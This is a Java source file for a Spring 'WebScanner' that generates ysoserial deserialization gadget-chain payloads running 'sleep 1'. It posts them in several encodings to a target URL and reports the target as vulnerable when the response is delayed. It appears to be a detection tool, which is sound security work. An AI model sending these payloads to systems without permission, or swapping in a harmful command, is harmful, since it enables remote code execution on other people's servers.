package pw.inz.serializationcenter.webscanner;


import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.client.WebClient;
import org.springframework.web.reactive.function.client.WebClientException;
import pw.inz.serializationcenter.payloadgenerator.ysoserialPassThru;


import java.io.*;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.rmi.ConnectException;
import java.util.HashMap;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.GZIPOutputStream;

@Component
@Scope("singleton")
public class WebScanner {

    private final int sleepTime = 1;
    private final String[] payloads = new String[]{"BeanShell1", "Click1", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4","CommonsCollections6", "CommonsCollections7", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient",  "JavassistWeld1", "Jdk7u21", "MozillaRhino2", "Myfaces1",  "ROME", "Spring1", "Spring2"};//todo from databse

    private final ysoserialPassThru ysoserialPass;

    @Autowired
    public WebScanner() {
        ysoserialPass = new ysoserialPassThru();
        for (String payload : payloads) {
            ysoserialPass.save(payload, "sleep " + sleepTime,payload);
        }
    }



    public long sendBytePost(byte[] payload, String url){
        //bytes send



        WebClient webClient = WebClient.builder()
                .baseUrl(url)
                .defaultHeader(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_JSON_VALUE)

                .build();


        long start = System.nanoTime();
        MultiValueMap<String, byte[]> formData = new LinkedMultiValueMap<>();
        formData.add("",payload);

        webClient.post()
                .uri("")
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .header(HttpHeaders.CONTENT_LENGTH, String.valueOf(payload.length))
                .bodyValue(payload)
                .retrieve()
                .bodyToMono(String.class)
                .onErrorMap(IOException.class, UncheckedIOException::new)
                .block();
        long stop = System.nanoTime();
        return stop-start;
    }

    public byte[] loadPayload(String payload)  {
        try {
            return Files.readAllBytes(Paths.get(System.getProperty("user.dir") + "\\libs\\"+payload));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    public String doScan(String url) {
        StringBuilder result = new StringBuilder();
        for (String payload : payloads) {
            if (loadPayload(payload) != null) {
                try {
                   if(sendBytePost(loadPayload(payload),url)>1000000000){
                       result.append("Seems vulnerable to ").append(payload).append(" using plain byte post");
                   }
                   if(sendBytePost(Base64.encodeBase64(loadPayload(payload)),url)>1000000000){
                       result.append("Seems vulnerable to ").append(payload).append(" using base64 post");
                   }
                    if(sendBytePost(Base64.encodeBase64URLSafe(loadPayload(payload)),url)>1000000000){
                        result.append("Seems vulnerable to ").append(payload).append(" using base64 urlsafe post");
                    }
                    if(sendBytePost(URLEncoder.encode(new String(loadPayload(payload), StandardCharsets.ISO_8859_1), StandardCharsets.ISO_8859_1).getBytes(),url)>1000000000){
                        result.append("Seems vulnerable to ").append(payload).append(" using url encoding post");
                    }


                } catch (WebClientException | UncheckedIOException ex){
                    System.out.println("error");
                }
            }
        }
        if (result.toString().equals("")) {
            return "Application is not vulnerable to any payload";
        } else {
            return result.toString();
        }


    }
}
